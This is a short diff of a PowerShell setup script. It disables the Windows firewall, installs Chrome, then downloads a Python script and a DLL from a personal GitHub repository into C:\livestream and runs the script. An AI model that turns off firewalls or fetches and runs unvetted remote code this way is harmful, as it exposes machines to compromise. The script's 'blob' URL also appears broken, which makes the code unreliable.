@@ -4,19 +4,14 @@ Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
 & {$P = $env:TEMP + '\chrome_installer.exe'; Invoke-WebRequest 'https://dl.google.com/chrome/install/latest/chrome_installer.exe' -OutFile $P; Start-Process -FilePath $P -Args '/install' -Verb RunAs -Wait; Remove-Item $P}
 
 
+$folderPath = "C:\livestream"
 $pythonScriptUrl = "https://github.com/singsangsingsang1/host/blob/main/main.py"
 $dllFileUrl = "https://github.com/singsangsingsang1/host/raw/main/LivestreamProcessor.dll"
 
-$folderName = "livestream"
+New-Item -Path $folderPath -ItemType Directory -Force
 
-$downloadsPath = [System.Environment]::GetFolderPath('Downloads')
+Invoke-WebRequest -Uri $pythonScriptUrl -OutFile "$folderPath\main.py"
 
-$newFolderPath = Join-Path -Path $downloadsPath -ChildPath $folderName
-New-Item -Path $newFolderPath -ItemType Directory
+Invoke-WebRequest -Uri $dllFileUrl -OutFile "$folderPath\LivestreamProcessor.dll"
 
-Invoke-WebRequest -Uri $pythonScriptUrl -OutFile (Join-Path -Path $newFolderPath -ChildPath "main.py")
-
-Invoke-WebRequest -Uri $dllFileUrl -OutFile (Join-Path -Path $newFolderPath -ChildPath "LivestreamProcessor.dll")
-
-$pythonScriptPath = Join-Path -Path $newFolderPath -ChildPath "main.py"
-Start-Process -FilePath "python" -ArgumentList $pythonScriptPath
+Start-Process -FilePath "python.exe" -ArgumentList "$folderPath\main.py"
